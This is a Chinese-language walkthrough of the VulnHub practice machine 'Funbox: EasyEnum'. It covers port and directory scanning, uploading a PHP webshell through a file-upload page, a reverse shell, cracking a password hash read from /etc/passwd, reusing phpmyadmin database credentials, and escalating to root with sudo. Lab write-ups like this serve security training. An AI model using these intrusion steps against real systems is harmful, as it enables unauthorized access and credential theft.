# Funbox: EasyEnum

2024-5-18 https://www.vulnhub.com/entry/funbox-easyenum,565/

difficulty: easy

## IP

192.168.5.29

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9c52325b8bf638c77fa1b704854954f3 (RSA)
|   256 d6135606153624ad655e7aa18ce564f4 (ECDSA)
|_  256 1ba9f35ad05183183a23ddc4a9be59f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

先看 80 web 服务，进行目录扫描：

```
gobuster dir -u http://192.168.5.29/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

http://192.168.5.29/index.html           (Status: 200) [Size: 10918]
http://192.168.5.29/javascript           (Status: 301) [Size: 317] [--> http://192.168.5.29/javascript/]
http://192.168.5.29/mini.php             (Status: 200) [Size: 4443]
http://192.168.5.29/robots.txt           (Status: 200) [Size: 21]
http://192.168.5.29/secret               (Status: 301) [Size: 313] [--> http://192.168.5.29/secret/]
http://192.168.5.29/phpmyadmin           (Status: 301) [Size: 317] [--> http://192.168.5.29/phpmyadmin/]
```

robots.txt 中的内容：Allow: Enum_this_Box

http://192.168.5.29/secret/ 中显示了一串字符串(回头看来这里是个兔子洞，在迷惑我们)：

```
根密码是用户密码的组合：harrysallygoatoraclelissy
```

http://192.168.5.29/mini.php 是重点内容，可以上传文件。上传我们的 php 后门文件，让后在 kali 上监听 8888 端口，访问 webshell 文件后，得到了反弹的 shell。可以看到文件存储在/var/www/html 中：

```
curl http://192.168.5.29/8888.php
```

/etc/passwd 中有几个用户：

```
root:x:0:0:root:/root:/bin/bash
karla:x:1000:1000:karla:/home/karla:/bin/bash
harry:x:1001:1001:,,,:/home/harry:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash
goat:x:1003:1003:,,,:/home/goat:/bin/bash
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh
```

oracle 用户的密码存储在/etc/passwd 中，可使用 john 进行破解，明文密码为：hiphop。

根据靶场提示，先访问下 karla 目录，看看有什么信息：

```
www-data@funbox7:/home/karla$ cat read.me
karla is really not a part of this CTF !
```

没什么用，提示这个用户不是这个靶场的关键点(回头看来，这里是在迷惑我们)。

直接切换到 oracle:hiphop 用户，看看能有什么进展，oracle 用户没有 sudo 权限。

内核等其他方面也暂时没发现可以利用的漏洞点。

最开始还有一个 phpmyadmin 的应用，在 /etc/phpmyadmin 中，找到了数据库的配置文件 config-db.php:

```
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

发现了一个新的密码:tgbzhnujm!，尝试用这个密码 su 切换到其他几个非 oracle 用户，看是否有成功的，结果 karla 切换成功。

karla 拥有最全的 sudo 权限，可以直接切换到 root 用户：

```
karla@funbox7:~$ sudo su
root@funbox7:/home/karla# cd /root
root@funbox7:~# id
uid=0(root) gid=0(root) groups=0(root)
root@funbox7:~# ls
html.tar.gz  root.flag  script.sh
root@funbox7:~# cat root.flag
  █████▒ █    ██  ███▄    █  ▄▄▄▄    ▒█████  ▒██   ██▒
▓██   ▒  ██  ▓██▒ ██ ▀█   █ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░
▒████ ░ ▓██  ▒██░▓██  ▀█ ██▒▒██▒ ▄██▒██░  ██▒░░  █   ░
░▓█▒  ░ ▓▓█  ░██░▓██▒  ▐▌██▒▒██░█▀  ▒██   ██░ ░ █ █ ▒
░▒█░    ▒▒█████▓ ▒██░   ▓██░░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒
 ▒ ░    ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
 ░      ░░▒░ ░ ░ ░ ░░   ░ ▒░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░
 ░ ░     ░░░ ░ ░    ░   ░ ░  ░    ░ ░ ░ ░ ▒   ░    ░
           ░              ░  ░          ░ ░   ░    ░
                                  ░
▓█████  ▄▄▄        ██████ ▓██   ██▓▓█████  ███▄    █  █    ██  ███▄ ▄███▓
▓█   ▀ ▒████▄    ▒██    ▒  ▒██  ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒▓██▒▀█▀ ██▒
▒███   ▒██  ▀█▄  ░ ▓██▄     ▒██ ██░▒███   ▓██  ▀█ ██▒▓██  ▒██░▓██    ▓██░
▒▓█  ▄ ░██▄▄▄▄██   ▒   ██▒  ░ ▐██▓░▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░▒██    ▒██
░▒████▒ ▓█   ▓██▒▒██████▒▒  ░ ██▒▓░░▒████▒▒██░   ▓██░▒▒█████▓ ▒██▒   ░██▒
░░ ▒░ ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░   ██▒▒▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░
 ░ ░  ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▓██ ░▒░  ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ ░  ░      ░
   ░     ░   ▒   ░  ░  ░   ▒ ▒ ░░     ░      ░   ░ ░  ░░░ ░ ░ ░      ░
   ░  ░      ░  ░      ░   ░ ░        ░  ░         ░    ░            ░
                           ░ ░

...solved !

Please, tweet this screenshot to @0815R2d2. Many thanks in advance.
```
